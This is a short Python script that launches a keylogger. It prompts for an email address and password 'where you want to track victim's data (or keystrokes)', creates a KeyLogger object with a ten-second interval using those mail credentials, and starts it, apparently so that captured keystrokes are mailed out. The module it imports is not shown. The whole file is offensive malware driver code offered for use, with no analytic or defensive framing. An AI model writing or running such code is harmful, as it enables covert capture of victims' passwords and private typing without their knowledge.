import keylogger


# Initialize / create keylogger
mail=input("Enter the mail where you want to track victim's data (or keystrokes):")
password=input("Enter the password:")

malicious_keylogger = keylogger.KeyLogger(10, mail, password)

# Execute Keylogger

malicious_keylogger.start()